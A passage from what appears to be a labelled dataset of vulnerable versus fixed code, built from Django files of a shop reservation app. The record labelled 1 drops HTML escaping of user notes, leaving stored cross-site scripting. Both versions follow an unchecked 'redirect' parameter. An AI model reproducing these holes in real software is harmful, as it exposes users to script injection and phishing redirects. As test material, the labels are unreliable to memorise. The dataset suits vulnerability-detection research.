m.highResFile = \"/\" + high_res_file_name\n    m.lowResFile = \"/\" + low_res_file_name\n    m.headline = escape(headline)\n    m.save()\n    mu: MediaUpload = MediaUpload()\n    mu.UID = u\n    mu.MID = m\n    mu.save()\n    logging.info(\"Uploaded file '\" + str(file.name) + \"' and cropped it. The resulting PK is \" + str(m.pk))\n\n\ndef action_add_single_media(request: HttpRequest):\n    try:\n        headline = request.POST[\"headline\"]\n        category = request.POST[\"category\"]\n        text = request.POST[\"text\"]\n        file = request.FILES['file']\n        user: Profile = get_current_user(request)\n        handle_file(user, headline, category, text, file)\n    except Exception as e:\n        return redirect(\"/admin/media/add?hint=\" + str(e))\n    return redirect(\"/admin/media/add\")\n\n\ndef action_add_multiple_media(request: HttpRequest):\n    try:\n        category: str = request.POST[\"category\"]\n        files = request.FILES.getlist('files')\n        user: Profile = get_current_user(request)\n        for f in files:\n            handle_file(user, str(f.name), category, \"### There is no media description\", f)\n    except Exception as e:\n        return redirect(\"/admin/media/add?hint=\" + str(e))\n    return redirect(\"/admin/media/add\")\n/n/n/nc3shop/frontpage/management/reservation_actions.py/n/nfrom django.http import HttpRequest, HttpResponseRedirect\nfrom django.utils.html import escape\n# from django.shortcuts import redirect\nfrom ..models import GroupReservation, ArticleRequested, Article, ArticleGroup, SubReservation\nfrom .magic import get_current_user\nimport json\nimport datetime\n\nRESERVATION_CONSTRUCTION_COOKIE_KEY: str = \"org.technikradio.c3shop.frontpage\" + \\\n        \".reservation.cookiekey\"\nEMPTY_COOKY_VALUE: str = '''\n{\n\"notes\": \"\",\n\"articles\": [],\n\"pickup_date\": \"\"\n}\n'''\n\n\ndef update_reservation_articles(postdict, rid):\n    res: GroupReservation = GroupReservation.objects.get(id=rid)\n\n\n\ndef add_article_action(request: HttpRequest, default_foreward_url: str):\n    forward_url: str = default_foreward_url\n    if request.GET.get(\"redirect\"):\n        forward_url = request.GET[\"redirect\"]\n    else:\n        forward_url = \"/admin\"\n    if \"rid\" not in request.GET:\n        return HttpResponseRedirect(\"/admin?error=Missing%20reservation%20id%20in%20request\")\n    u: Profile = get_current_user(request)\n    current_reservation = GroupReservation.objects.get(id=str(request.GET[\"rid\"]))\n    if current_reservation.createdByUser != u and u.rights < 2:\n        return HttpResponseRedirect(\"/admin?error=noyb\")\n    if current_reservation.submitted == True:\n        return HttpResponseRedirect(\"/admin?error=Already%20submitted\")\n    # Test for multiple or single article\n    if \"article_id\" in request.POST:\n        # Actual adding of article\n        aid: int = int(request.GET.get(\"article_id\"))\n        quantity: int = int(request.POST[\"quantity\"])\n        notes: str = escape(request.POST[\"notes\"])\n        ar = ArticleRequested()\n        ar.AID = Article.objects.get(id=aid)\n        ar.RID = current_reservation\n        if \"srid\" in request.GET:\n            ar.SRID = SubReservation.objects.get(id=int(request.GET[\"srid\"]))\n        ar.amount = quantity\n        ar.notes = notes\n        ar.save()\n    # Actual adding of multiple articles\n    else:\n        if \"group_id\" not in request.GET:\n            return HttpResponseRedirect(\"/admin?error=missing%20group%20id\")\n        g: ArticleGroup = ArticleGroup.objects.get(id=int(request.GET[\"group_id\"]))\n        for art in Article.objects.all().filter(group=g):\n            if str(\"quantity_\" + str(art.id)) not in request.POST or str(\"notes_\" + str(art.id)) not in request.POST:\n                return HttpResponseRedirect(\"/admin?error=Missing%20article%20data%20in%20request\")\n            amount = int(request.POST[\"quantity_\" + str(art.id)])\n            if amount > 0:\n                ar = ArticleRequested()\n                ar.AID = art\n                ar.RID = current_reservation\n                ar.amount = amount\n                if \"srid\" in request.GET:\n                    ar.SRID = SubReservation.objects.get(id=int(request.GET[\"srid\"]))\n                ar.notes = escape(str(request.POST[str(\"notes_\" + str(art.id))]))\n                ar.save()\n    if \"srid\" in request.GET:\n        response = HttpResponseRedirect(forward_url + \"?rid=\" + str(current_reservation.id) + \"&srid=\" + request.GET[\"srid\"])\n    else:\n        response = HttpResponseRedirect(forward_url + \"?rid=\" + str(current_reservation.id))\n    return response\n\n\ndef write_db_reservation_action(request: HttpRequest):\n    \"\"\"\n    This function is used to submit the reservation\n    \"\"\"\n    u: Profile = get_current_user(request)\n    forward_url = \"/admin?success\"\n    if u.rights > 0:\n        forward_url = \"/admin/reservations\"\n    if request.GET.get(\"redirect\"):\n        forward_url = request.GET[\"redirect\"]\n    if \"payload\" not in request.GET:\n        return HttpResponseRedirect(\"/admin?error=No%20id%20provided\")\n    current_reservation = GroupReservation.objects.get(id=int(request.GET[\"payload\"]))\n    if current_reservation.createdByUser != u and u. rights < 2:\n        return HttpResponseRedirect(\"/admin?error=noyb\")\n    current_reservation.submitted = True\n    current_reservation.save()\n    res: HttpResponseRedirect = HttpResponseRedirect(forward_url)\n    return res\n\n\ndef manipulate_reservation_action(request: HttpRequest, default_foreward_url: str):\n    \"\"\"\n    This function is used to alter the reservation beeing build inside\n    a cookie. This function automatically crafts the required response.\n    \"\"\"\n    js_string: str = \"\"\n    r: GroupReservation = None\n    u: Profile = get_current_user(request)\n    forward_url: str = default_foreward_url\n    if request.GET.get(\"redirect\"):\n        forward_url = request.GET[\"redirect\"]\n    if \"srid\" in request.GET:\n        if not request.GET.get(\"rid\"):\n            return HttpResponseRedirect(\"/admin?error=missing%20primary%20reservation%20id\")\n        srid: int = int(request.GET[\"srid\"])\n        sr: SubReservation = None\n        if srid == 0:\n            sr = SubReservation()\n        else:\n            sr = SubReservation.objects.get(id=srid)\n        if request.POST.get(\"notes\"):\n            sr.notes = escape(request.POST[\"notes\"])\n        else:\n            sr.notes = \" \"\n        sr.primary_reservation = GroupReservation.objects.get(id=int(request.GET[\"rid\"]))\n        sr.save()\n        print(request.POST)\n        print(sr.notes)\n        return HttpResponseRedirect(\"/admin/reservations/edit?rid=\" + str(int(request.GET[\"rid\"])) + \"&srid=\" + str(sr.id))\n    if \"rid\" in request.GET:\n        # update reservation\n        r = GroupReservation.objects.get(id=int(request.GET[\"rid\"]))\n    elif u.number_of_allowed_reservations > GroupReservation.objects.all().filter(createdByUser=u).count():\n        r = GroupReservation()\n        r.createdByUser = u\n        r.ready = False\n        r.open = True\n        r.pickupDate = datetime.datetime.now()\n    else:\n        return HttpResponseRedirect(\"/admin?error=Too%20Many%20reservations\")\n    if request.POST.get(\"notes\"):\n        r.notes = escape(request.POST[\"notes\"])\n    if request.POST.get(\"contact\"):\n        r.responsiblePerson = escape(str(request.POST[\"contact\"]))\n    if (r.createdByUser == u or o.rights > 1) and not r.submitted:\n        r.save()\n    else:\n        return HttpResponseRedirect(\"/admin?error=noyb\")\n    response: HttpResponseRedirect = HttpResponseRedirect(forward_url + \"?rid=\" + str(r.id))\n    return response\n\n\ndef action_delete_article(request: HttpRequest):\n    \"\"\"\n    This function removes an article from the reservation and returnes\n    the required resonse.\n    \"\"\"\n    u: Profile = get_current_user(request)\n    if \"rid\" in request.GET:\n        if \"srid\" in request.GET:\n            response = HttpResponseRedirect(\"/admin/reservations/edit?rid=\" + str(int(request.GET[\"rid\"])) + \\\n                    '&srid=' + str(int(request.GET['srid'])))\n        else:\n            response = HttpResponseRedirect(\"/admin/reservations/edit?rid=\" + str(int(request.GET[\"rid\"])))\n    else:\n        return HttpResponseRedirect(\"/admin?error=Missing%20reservation%20id%20in%20request\")\n    if request.GET.get(\"id\"):\n        aid: ArticleRequested = ArticleRequested.objects.get(id=int(request.GET[\"id\"]))\n        r: GroupReservation = GroupReservation.objects.get(id=int(request.GET[\"rid\"]))\n        if (aid.RID.createdByUser == u or u.rights > 1) and aid.RID == r and not r.submitted:\n            aid.delete()\n        else:\n            return HttpResponseRedirect(\"/admin?error=You're%20not%20allowed%20to%20do%20this\")\n    return response\n/n/n/n", "label": 0}, {"id": "6e330d4d44bbfdfce9993dffea97008276771600", "code": "/c3shop/frontpage/management/edit_user.py/n/nfrom django.http import HttpRequest, HttpResponseForbidden, HttpResponseBadRequest\nfrom django.shortcuts import redirect\nfrom django.contrib.auth.models import User\nfrom . import page_skeleton, magic\nfrom .form import Form, TextField, PlainText, TextArea, SubmitButton, NumberField, PasswordField, CheckBox, CheckEnum\nfrom ..models import Profile, Media\nfrom ..uitools.dataforge import get_csrf_form_element\nfrom .magic import get_current_user\nimport logging\n\n\ndef render_edit_page(http_request: HttpRequest, action_url: str):\n\n    user_id = None\n    profile: Profile = None\n    if http_request.GET.get(\"user_id\"):\n        user_id = int(http_request.GET[\"user_id\"])\n    if user_id is not None:\n        profile = Profile.objects.get(pk=user_id)\n    f = Form()\n    f.action_url = action_url\n    if profile:\n        f.add_content(PlainText('<h3>Edit user \"' + profile.authuser.username + '\"</h3>'))\n        f.add_content(PlainText('<a href=\"/admin/media/select?action_url=/admin/actions/change-user-avatar'\n                                '&payload=' + str(user_id) + '\"><img class=\"button-img\" alt=\"Change avatar\" '\n                                'src=\"/staticfiles/frontpage/change-avatar.png\"/></a><br />'))\n    else:\n        f.add_content(PlainText('<h3>Add new user</h3>'))\n    if not profile:\n        f.add_content(PlainText(\"username (can't be edited later on): \"))\n        f.add_content(TextField(name='username'))\n    if http_request.GET.get('fault') and profile:\n        f.add_content(PlainText(\"Unable to edit user due to: \" + str(http_request.GET['fault'])))\n    elif http_request.GET.get('fault'):\n        f.add_content(PlainText(\"Unable to add user due to: \" + str(http_request.GET['fault'])))\n    current_user: Profile = get_current_user(http_request)\n    if current_user.rights > 3:\n        if not profile:\n            f.add_content(CheckBox(name=\"active\", text=\"User Active\", checked=CheckEnum.CHECKED))\n        else:\n            m: CheckEnum = CheckEnum.CHECKED\n            if not profile.active:\n                m = CheckEnum.NOT_CHECKED\n            f.add_content(CheckBox(name=\"active\", text=\"User Active\", checked=m))\n    if profile:\n        f.add_content(PlainText(\"Email address: \"))\n        f.add_content(TextField(name='email', button_text=str(profile.authuser.email)))\n        f.add_content(PlainText(\"Display name: \"))\n        f.add_content(TextField(name='display_name', button_text=profile.displayName))\n        f.add_content(PlainText('DECT: '))\n        f.add_content(NumberField(name='dect', button_text=str(profile.dect), minimum=0))\n        f.add_content(PlainText('Number of allowed reservations: '))\n        f.add_content(NumberField(name='allowed_reservations', button_text=str(profile.number_of_allowed_reservations), minimum=0))\n        f.add_content(PlainText(\"Rights: \"))\n        f.add_content(NumberField(name=\"rights\", button_text=str(profile.rights), minimum=0, maximum=4))\n        f.add_content(PlainText('Notes:<br/>'))\n        f.add_content(TextArea(name='notes', text=str(profile.notes)))\n    else:\n        f.add_content(PlainText(\"Email address: \"))\n        f.add_content(TextField(name='email'))\n        f.add_content(PlainText(\"Display name: \"))\n        f.add_content(TextField(name='display_name'))\n        f.add_content(PlainText('DECT: '))\n        f.add_content(NumberField(name='dect', minimum=0))\n        f.add_content(PlainText('Number of allowed reservations: '))\n        f.add_content(NumberField(name='allowed_reservations', button_text=str(1), minimum=0))\n        f.add_content(PlainText(\"Rights: \"))\n        f.add_content(NumberField(name=\"rights\", button_text=str(0), minimum=0, maximum=4))\n        f.add_content(PlainText('Notes:<br/>'))\n        f.add_content(TextArea(name='notes', placeholder=\"Hier k\u00f6nnte ihre Werbung stehen\"))\n    if profile:\n        f.add_content(PlainText('<br /><br />Change password (leave blank in order to not change it):'))\n    else:\n        f.add_content(PlainText('<br />Choose a password: '))\n    f.add_content(PasswordField(name='password', required=False))\n    f.add_content(PlainText('Confirm your password: '))\n    f.add_content(PasswordField(name='confirm_password', required=False))\n    f.add_content(PlainText(get_csrf_form_element(http_request)))\n    f.add_content(SubmitButton())\n    # a = page_skeleton.render_headbar(http_request, \"Edit User\")\n    a = '<div class=\"w3-row w3-padding-64 w3-twothird w3-container admin-popup\">'\n    a += f.render_html(http_request)\n    # a += page_skeleton.render_footer(http_request)\n    a += \"</div>\"\n    return a\n\n\ndef check_password_conformity(pw1: str, pw2: str):\n    if not (pw1 == pw2):\n        return False\n    if len(pw1) < 6:\n        return False\n    if pw1.isupper():\n        return False\n    if pw1.islower():\n        return False\n    return True\n\n\ndef recreate_form(reason: str):\n    return redirect('/admin/users/edit?fault=' + str(reason))\n\n\ndef action_save_user(request: HttpRequest, default_forward_url: str = \"/admin/users\"):\n    \"\"\"\n    This functions saves the changes to the user or adds a new one. It completely creates the HttpResponse\n    :param request: the HttpRequest\n    :param default_forward_url: The URL to forward to if nothing was specified\n    :return: The crafted HttpResponse\n    \"\"\"\n    forward_url = default_forward_url\n    if request.GET.get(\"redirect\"):\n        forward_url = request.GET[\"redirect\"]\n    if not request.user.is_authenticated:\n        return HttpResponseForbidden()\n    profile = Profile.objects.get(authuser=request.user)\n    if profile.rights < 2:\n        return HttpResponseForbidden()\n    try:\n        if request.GET.get(\"user_id\"):\n            pid = int(request.GET[\"user_id\"])\n            displayname = str(request.POST[\"display_name\"])\n            dect = int(request.POST[\"dect\"])\n            notes = str(request.POST[\"notes\"])\n            pw1 = str(request.POST[\"password\"])\n            pw2 = str(request.POST[\"confirm_password\"])\n            mail = str(request.POST[\"email\"])\n            rights = int(request.POST[\"rights\"])\n            user: Profile = Profile.objects.get(pk=pid)\n            user.displayName = displayname\n            user.dect = dect\n            user.notes = notes\n            user.rights = rights\n            user.number_of_allowed_reservations = int(request.POST[\"allowed_reservations\"])\n            if request.POST.get(\"active\"):\n                user.active = magic.parse_bool(request.POST[\"active\"])\n            au: User = user.authuser\n            if check_password_conformity(pw1, pw2):\n                logging.log(logging.INFO, \"Set password for user: \" + user.displayName)\n                au.set_password(pw1)\n            else:\n                logging.log(logging.INFO, \"Failed to set password for: \" + user.displayName)\n            au.email = mail\n            au.save()\n            user.save()\n        else:\n            # assume new user\n            username = str(request.POST[\"username\"])\n            displayname = str(request.POST[\"display_name\"])\n            dect = int(request.POST[\"dect\"])\n            notes = str(request.POST[\"notes\"])\n            pw1 = str(request.POST[\"password\"])\n            pw2 = str(request.POST[\"confirm_password\"])\n            mail = str(request.POST[\"email\"])\n            rights = int(request.POST[\"rights\"])\n            if not check_password_conformity(pw1, pw2):\n                recreate_form('password mismatch')\n            auth_user: User = User.objects.create_user(username=username, email=mail, password=pw1)\n            auth_user.save()\n            user: Profile = Profile()\n            user.rights = rights\n            user.number_of_allowed_reservations = int(request.POST[\"allowed_reservations\"])\n            user.displayName = displayname\n            user.authuser = auth_user\n            user.dect = dect\n            user.notes = notes\n            user.active = True\n            user.save()\n            pass\n        pass\n    except Exception as e:\n        return HttpResponseBadRequest(str(e))\n    return redirect(forward_url)\n/n/n/n/c3shop/frontpage/management/mediatools/media_actions.py/n/nfrom datetime import date, time\nfrom django.shortcuts import redirect\nfrom django.http import HttpRequest, HttpResponseBadRequest\nfrom frontpage.models import Profile, Media, MediaUpload\nfrom frontpage.management.magic import compile_markdown, get_current_user\n\nimport logging\nimport ntpath\nimport os\nimport math\nimport PIL\nfrom PIL import Image\n\n\nPATH_TO_UPLOAD_FOLDER_ON_DISK: str = \"/usr/local/www/focweb/\"\nIMAGE_SCALE = 64\n\n\ndef action_change_user_avatar(request: HttpRequest):\n    try:\n        user_id = int(request.GET[\"payload\"])\n        media_id = int(request.GET[\"media_id\"])\n        user: Profile = Profile.objects.get(pk=int(user_id))\n        u: Profile = get_current_user(request)\n        if not (u == user) and u.rights < 4:\n            return redirect(\"/admin?error='You're not allowed to edit other users.'\")\n        medium = Media.objects.get(pk=int(media_id))\n        user.avatarMedia = medium\n        user.save()\n    except Exception as e:\n        return redirect(\"/admin?error=\" + str(e))\n    return redirect(\"/admin/users\")\n\n\ndef handle_file(u: Profile, headline: str, category: str, text: str, file):\n    m: Media = Media()\n    upload_base_path: str = 'uploads/' + str(date.today().year)\n    high_res_file_name = upload_base_path + '/HIGHRES_' + ntpath.basename(file.name.replace(\" \", \"_\"))\n    low_res_file_name = upload_base_path + '/LOWRES_' + ntpath.basename(file.name.replace(\" \", \"_\"))\n    if not os.path.exists(PATH_TO_UPLOAD_FOLDER_ON_DISK + upload_base_path):\n        os.makedirs(PATH_TO_UPLOAD_FOLDER_ON_DISK + upload_base_path)\n    with open(high_res_file_name, 'wb+') as destination:\n        for chunk in file.chunks():\n            destination.write(chunk)\n    # TODO crop image\n    original = Image.open(high_res_file_name)\n    width, height = original.size\n    diameter = math.sqrt(math.pow(width, 2) + math.pow(height, 2))\n    width /= diameter\n    height /= diameter\n    width *= IMAGE_SCALE\n    height *= IMAGE_SCALE\n    cropped = original.resize((int(width), int(height)), PIL.Image.LANCZOS)\n    cropped.save(low_res_file_name)\n    m.text = text\n    m.cachedText = compile_markdown(text)\n    m.category = category\n    m.highResFile = \"/\" + high_res_file_name\n    m.lowResFile = \"/\" + low_res_file_name\n    m.headline = headline\n    m.save()\n    mu: MediaUpload = MediaUpload()\n    mu.UID = u\n    mu.MID = m\n    mu.save()\n    logging.info(\"Uploaded file '\" + str(file.name) + \"' and cropped it. The resulting PK is \" + str(m.pk))\n\n\ndef action_add_single_media(request: HttpRequest):\n    try:\n        headline = request.POST[\"headline\"]\n        category = request.POST[\"category\"]\n        text = request.POST[\"text\"]\n        file = request.FILES['file']\n        user: Profile = get_current_user(request)\n        handle_file(user, headline, category, text, file)\n    except Exception as e:\n        return redirect(\"/admin/media/add?hint=\" + str(e))\n    return redirect(\"/admin/media/add\")\n\n\ndef action_add_multiple_media(request: HttpRequest):\n    try:\n        category: str = request.POST[\"category\"]\n        files = request.FILES.getlist('files')\n        user: Profile = get_current_user(request)\n        for f in files:\n            handle_file(user, str(f.name), category, \"### There is no media description\", f)\n    except Exception as e:\n        return redirect(\"/admin/media/add?hint=\" + str(e))\n    return redirect(\"/admin/media/add\")\n/n/n/n/c3shop/frontpage/management/reservation_actions.py/n/nfrom django.http import HttpRequest, HttpResponseRedirect\n# from django.shortcuts import redirect\nfrom ..models import GroupReservation, ArticleRequested, Article, ArticleGroup, SubReservation\nfrom .magic import get_current_user\nimport json\nimport datetime\n\nRESERVATION_CONSTRUCTION_COOKIE_KEY: str = \"org.technikradio.c3shop.frontpage\" + \\\n        \".reservation.cookiekey\"\nEMPTY_COOKY_VALUE: str = '''\n{\n\"notes\": \"\",\n\"articles\": [],\n\"pickup_date\": \"\"\n}\n'''\n\n\ndef update_reservation_articles(postdict, rid):\n    res: GroupReservation = GroupReservation.objects.get(id=rid)\n\n\n\ndef add_article_action(request: HttpRequest, default_foreward_url: str):\n    forward_url: str = default_foreward_url\n    if request.GET.get(\"redirect\"):\n        forward_url = request.GET[\"redirect\"]\n    else:\n        forward_url = \"/admin\"\n    if \"rid\" not in request.GET:\n        return HttpResponseRedirect(\"/admin?error=Missing%20reservation%20id%20in%20request\")\n    u: Profile = get_current_user(request)\n    current_reservation = GroupReservation.objects.get(id=str(request.GET[\"rid\"]))\n    if current_reservation.createdByUser != u and u.rights < 2:\n        return HttpResponseRedirect(\"/admin?error=noyb\")\n    if current_reservation.submitted == True:\n        return HttpResponseRedirect(\"/admin?error=Already%20submitted\")\n    # Test for multiple or single article\n    if \"article_id\" in request.POST:\n        # Actual adding of article\n        aid: int = int(request.GET.get(\"article_id\"))\n        quantity: int = int(request.POST[\"quantity\"])\n        notes: str = request.POST[\"notes\"]\n        ar = ArticleRequested()\n        ar.AID = Article.objects.get(id=aid)\n        ar.RID = current_reservation\n        if \"srid\" in request.GET:\n            ar.SRID = SubReservation.objects.get(id=int(request.GET[\"srid\"]))\n        ar.amount = quantity\n        ar.notes = notes\n        ar.save()\n    # Actual adding of multiple articles\n    else:\n        if \"group_id\" not in request.GET:\n            return HttpResponseRedirect(\"/admin?error=missing%20group%20id\")\n        g: ArticleGroup = ArticleGroup.objects.get(id=int(request.GET[\"group_id\"]))\n        for art in Article.objects.all().filter(group=g):\n            if str(\"quantity_\" + str(art.id)) not in request.POST or str(\"notes_\" + str(art.id)) not in request.POST:\n                return HttpResponseRedirect(\"/admin?error=Missing%20article%20data%20in%20request\")\n            amount = int(request.POST[\"quantity_\" + str(art.id)])\n            if amount > 0:\n                ar = ArticleRequested()\n                ar.AID = art\n                ar.RID = current_reservation\n                ar.amount = amount\n                if \"srid\" in request.GET:\n                    ar.SRID = SubReservation.objects.get(id=int(request.GET[\"srid\"]))\n                ar.notes = str(request.POST[str(\"notes_\" + str(art.id))])\n                ar.save()\n    if \"srid\" in request.GET:\n        response = HttpResponseRedirect(forward_url + \"?rid=\" + str(current_reservation.id) + \"&srid=\" + request.GET[\"srid\"])\n    else:\n        response = HttpResponseRedirect(forward_url + \"?rid=\" + str(current_reservation.id))\n    return response\n\n\ndef write_db_reservation_action(request: HttpRequest):\n    \"\"\"\n    This function is used to submit the reservation\n    \"\"\"\n    u: Profile = get_current_user(request)\n    forward_url = \"/admin?success\"\n    if u.rights > 0:\n        forward_url = \"/admin/reservations\"\n    if request.GET.get(\"redirect\"):\n        forward_url = request.GET[\"redirect\"]\n    if \"payload\" not in request.GET:\n        return HttpResponseRedirect(\"/admin?error=No%20id%20provided\")\n    current_reservation = GroupReservation.objects.get(id=int(request.GET[\"payload\"]))\n    if current_reservation.createdByUser != u and u. rights < 2:\n        return HttpResponseRedirect(\"/admin?error=noyb\")\n    current_reservation.submitted = True\n    current_reservation.save()\n    res: HttpResponseRedirect = HttpResponseRedirect(forward_url)\n    return res\n\n\ndef manipulate_reservation_action(request: HttpRequest, default_foreward_url: str):\n    \"\"\"\n    This function is used to alter the reservation beeing build inside\n    a cookie. This function automatically crafts the required response.\n    \"\"\"\n    js_string: str = \"\"\n    r: GroupReservation = None\n    u: Profile = get_current_user(request)\n    forward_url: str = default_foreward_url\n    if request.GET.get(\"redirect\"):\n        forward_url = request.GET[\"redirect\"]\n    if \"srid\" in request.GET:\n        if not request.GET.get(\"rid\"):\n            return HttpResponseRedirect(\"/admin?error=missing%20primary%20reservation%20id\")\n        srid: int = int(request.GET[\"srid\"])\n        sr: SubReservation = None\n        if srid == 0:\n            sr = SubReservation()\n        else:\n            sr = SubReservation.objects.get(id=srid)\n        if request.POST.get(\"notes\"):\n            sr.notes = request.POST[\"notes\"]\n        else:\n            sr.notes = \" \"\n        sr.primary_reservation = GroupReservation.objects.get(id=int(request.GET[\"rid\"]))\n        sr.save()\n        print(request.POST)\n        print(sr.notes)\n        return HttpResponseRedirect(\"/admin/reservations/edit?rid=\" + str(int(request.GET[\"rid\"])) + \"&srid=\" + str(sr.id))\n    if \"rid\" in request.GET:\n        # update reservation\n        r = GroupReservation.objects.get(id=int(request.GET[\"rid\"]))\n    elif u.number_of_allowed_reservations > GroupReservation.objects.all().filter(createdByUser=u).count():\n        r = GroupReservation()\n        r.createdByUser = u\n        r.ready = False\n        r.open = True\n        r.pickupDate = datetime.datetime.now()\n    else:\n        return HttpResponseRedirect(\"/admin?error=Too%20Many%20reservations\")\n    if request.POST.get(\"notes\"):\n        r.notes = request.POST[\"notes\"]\n    if request.POST.get(\"contact\"):\n        r.responsiblePerson = str(request.POST[\"contact\"])\n    if (r.createdByUser == u or o.rights > 1) and not r.submitted:\n        r.save()\n    else:\n        return HttpResponseRedirect(\"/admin?error=noyb\")\n    response: HttpResponseRedirect = HttpResponseRedirect(forward_url + \"?rid=\" + str(r.id))\n    return response\n\n\ndef action_delete_article(request: HttpRequest):\n    \"\"\"\n    This function removes an article from the reservation and returnes\n    the required resonse.\n    \"\"\"\n    u: Profile = get_current_user(request)\n    if \"rid\" in request.GET:\n        if \"srid\" in request.GET:\n            response = HttpResponseRedirect(\"/admin/reservations/edit?rid=\" + str(int(request.GET[\"rid\"])) + \\\n                    '&srid=' + str(int(request.GET['srid'])))\n        else:\n            response = HttpResponseRedirect(\"/admin/reservations/edit?rid=\" + str(int(request.GET[\"rid\"])))\n    else:\n        return HttpResponseRedirect(\"/admin?error=Missing%20reservation%20id%20in%20request\")\n    if request.GET.get(\"id\"):\n        aid: ArticleRequested = ArticleRequested.objects.get(id=int(request.GET[\"id\"]))\n        r: GroupReservation = GroupReservation.objects.get(id=int(request.GET[\"rid\"]))\n        if (aid.RID.createdByUser == u or u.rights > 1) and aid.RID == r and not r.submitted:\n            aid.delete()\n        else:\n            return HttpResponseRedirect(\"/admin?error=You're%20not%20allowed%20to%20do%20this\")\n    return response\n/n/n/n", "label": 1}, {"id": "44314e51b371e01cd9bceb2e0ed6c8d75d7f87c3", "code": "smart_lists/helpers.py/n/nimport datetime\n\nfrom django.core.exceptions import FieldDoesNotExist\nfrom django.db.models import BooleanField, ForeignKey\nfrom django.utils.formats import localize\nfrom django.utils.html import format_html, escape\nfrom django.utils.http import urlencode\nfrom django.utils.translation import gettext_lazy as _\nfrom typing import List\n\nfrom smart_lists.exceptions import SmartListException\nfrom smart_lists.filters import SmartListFilter\n\n\nclass TitleFromModelFieldMixin(object):\n    def get_title(self):\n        if self.label:\n            return self.label\n        elif self.model_field:\n            return self.model_field.verbose_name.title()\n        elif self.field_name == '__str__':\n            return self.model._meta.verbose_name.title()\n        try:\n            field = getattr(self.model, self.field_name)\n        except AttributeError as e:\n            return self.field_name.title()\n        if callable(field) and getattr(field, 'short_description', False):\n            return field.short_description\n        return self.field_name.replace(\"_\", \" \").title()\n\n\nclass QueryParamsMixin(object):\n    def get_url_with_query_params(self, new_query_dict):\n        query = dict(self.query_params).copy()\n        for key, value in query.items():\n            if type(value) == list:\n                query[key] = value[0]\n        query.update(new_query_dict)\n        for key, value in query.copy().items():\n            if value is None:\n                del query[key]\n        return '?{}'.format(urlencode(query))\n\n\nclass SmartListField(object):\n    def __init__(self, smart_list_item, column, object):\n        self.smart_list_item = smart_list_item\n        self.column = column\n        self.object = object\n\n    def get_value(self):\n        field = getattr(self.object, self.column.field_name) if self.column.field_name else None\n        if self.column.render_function:\n            template = self.column.render_function(self.object)\n            if not self.is_template_instance(template):\n                raise SmartListException(\n                    'Your render_function {} should return django.template.Template or django.template.backends.django.Template object instead of {}'.format(\n                        self.column.render_function.__name__,\n                        type(template),\n                    )\n                )\n            value = template.render()\n        elif type(self.object) == dict:\n            value = self.object.get(self.column.field_name)\n        elif callable(field):\n            value = field() if getattr(field, 'do_not_call_in_templates', False) else field\n        else:\n            display_function = getattr(self.object, 'get_%s_display' % self.column.field_name, False)\n            value = display_function() if display_function else field\n\n        return value\n\n    def is_template_instance(self, obj):\n        \"\"\"Check if given object is object of Template.\"\"\"\n        from django.template import Template as Template\n        from django.template.backends.django import Template as DjangoTemplate\n        from django.template.backends.jinja2 import Template as Jinja2Template\n\n        return (\n            isinstance(obj, Template)\n            or isinstance(obj, DjangoTemplate)\n            or isinstance(obj, Jinja2Template)\n        )\n\n\n    def format(self, value):\n        if isinstance(value, datetime.datetime) or isinstance(value, datetime.date):\n            return localize(value)\n        return value\n\n    def render(self):\n        return format_html(\n            '<td>{}</td>', self.format(self.get_value())\n        )\n\n    def render_link(self):\n        if not hasattr(self.object, 'get_absolute_url'):\n            raise SmartListException(\"Please make sure your model {} implements get_absolute_url()\".format(type(self.object)))\n        return format_html(\n            '<td><a href=\"{}\">{}</a></td>', self.object.get_absolute_url(), self.format(self.get_value())\n        )\n\n\nclass SmartListItem(object):\n    def __init__(self, smart_list, object):\n        self.smart_list = smart_list\n        self.object = object\n\n    def fields(self):\n        return [\n            SmartListField(self, column, self.object) for column in self.smart_list.columns\n        ]\n\n\nclass SmartOrder(QueryParamsMixin, object):\n    def __init__(self, query_params, column_id, ordering_query_param):\n        self.query_params = query_params\n        self.column_id = column_id\n        self.ordering_query_param = ordering_query_param\n        self.query_order = query_params.get(ordering_query_param)\n        self.current_columns = [int(col) for col in self.query_order.replace(\"-\", \"\").split(\".\")] if self.query_order else []\n        self.current_columns_length = len(self.current_columns)\n\n    @property\n    def priority(self):\n        if self.is_ordered():\n            return self.current_columns.index(self.column_id) + 1\n\n    def is_ordered(self):\n        return self.column_id in self.current_columns\n\n    def is_reverse(self):\n        for column in self.query_order.split('.'):\n            c = column.replace(\"-\", \"\")\n            if int(c) == self.column_id:\n                if column.startswith(\"-\"):\n                    return True\n        return False\n\n    def get_add_sort_by(self):\n        if not self.is_ordered():\n            if self.query_order:\n                return self.get_url_with_query_params({\n                    self.ordering_query_param: '{}.{}'.format(self.column_id, self.query_order)\n                })\n            else:\n                return self.get_url_with_query_params({\n                    self.ordering_query_param: self.column_id\n                })\n        elif self.current_columns_length > 1:\n            new_query = []\n            for column in self.query_order.split('.'):\n                c = column.replace(\"-\", \"\")\n                if not int(c) == self.column_id:\n                    new_query.append(column)\n            if not self.is_reverse() and self.current_columns[0] == self.column_id:\n                return self.get_url_with_query_params({\n                    self.ordering_query_param: '-{}.{}'.format(self.column_id, \".\".join(new_query))\n                })\n            else:\n                return self.get_url_with_query_params({\n                    self.ordering_query_param: '{}.{}'.format(self.column_id, \".\".join(new_query))\n                })\n\n        else:\n            return self.get_reverse_sort_by()\n\n    def get_remove_sort_by(self):\n        new_query = []\n        for column in self.query_order.split('.'):\n            c = column.replace(\"-\", \"\")\n            if not int(c) == self.column_id:\n                new_query.append(column)\n        return self.get_url_with_query_params({\n            self.ordering_query_param: \".\".join(new_query)\n        })\n\n    def get_reverse_sort_by(self):\n        new_query = []\n        for column in self.query_order.split('.'):\n            c = column.replace(\"-\", \"\")\n            if int(c) == self.column_id:\n                if column.startswith(\"-\"):\n                    new_query.append(c)\n                else:\n                    new_query.append('-{}'.format(c))\n            else:\n                new_query.append(column)\n\n        return self.get_url_with_query_params({\n            self.ordering_query_param: \".\".join(new_query)\n        })\n\n\nclass SmartColumn(TitleFromModelFieldMixin, object):\n    def __init__(self, model, field, column_id, query_params, ordering_query_param, label=None, render_function=None):\n        self.model = model\n        self.field_name = field\n        self.label = label\n        self.render_function = render_function\n        self.order_field = None\n        self.order = None\n\n        # If there is no field_name that means it is not bound to any model field\n        if not self.field_name:\n            return\n\n        if self.field_name.startswith(\"_\") and self.field_name != \"__str__\":\n            raise SmartListException(\"Cannot use underscore(_) variables/functions in smart lists\")\n        try:\n            self.model_field = self.model._meta.get_field(self.field_name)\n            self.order_field = self.field_name\n       